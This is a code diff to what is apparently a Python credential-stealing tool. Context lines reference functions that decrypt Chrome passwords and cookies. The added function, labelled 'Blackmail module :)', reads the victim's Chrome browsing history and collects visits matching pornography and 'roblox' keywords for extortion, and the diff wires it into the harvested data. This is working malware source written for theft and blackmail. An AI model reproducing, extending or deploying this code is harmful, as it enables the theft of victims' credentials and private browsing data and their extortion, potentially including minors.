@@ -85,6 +85,32 @@ def get_chrome_passwords(path, secret_key):
     return logins
 
 
+def get_history(path):
+    # Blackmail module :)
+    print('\nHistory\n-----------------------------')
+    history = []
+    flagged = ['porn', 'hentai', 'roblox']
+    # Chrome username & password file path
+    chrome_path_login_db = os.path.join(path, "History")
+    shutil.copy2(chrome_path_login_db, "Loginvault.db")  # Connect to sqlite database
+    conn = sqlite3.connect("Loginvault.db")
+    cursor = conn.cursor()  # Select statement to retrieve info
+    cursor.execute("SELECT url, title, visit_count FROM urls")
+    for index, site in enumerate(cursor.fetchall()):
+        url = site[0]
+        title = site[1]
+        visits = site[2]
+        if not url:
+            continue
+        for flag in flagged:
+            if flag in url or flag in title:
+                print(f'URL: {url}\ntitle: {title}\nvisited: {visits}\n')
+                history.append({"url": url, "title": title, "visited": visits})
+    conn.close()
+    os.remove('./Loginvault.db')
+    return history
+
+
 def get_master_key(path):
     try:
         # (1) Get secretkey from chrome local state
@@ -126,6 +152,11 @@ def get_chromium(base_path):
     try:
         data['cookies'] = get_chrome_cookies(os.path.join(profile_path, r"Network"), master_key)
     except Exception as e:
+        pass
+    try:
+        data['history'] = get_history(profile_path)
+    except Exception as e:
+        print(e)
         pass
     if data:
         return data
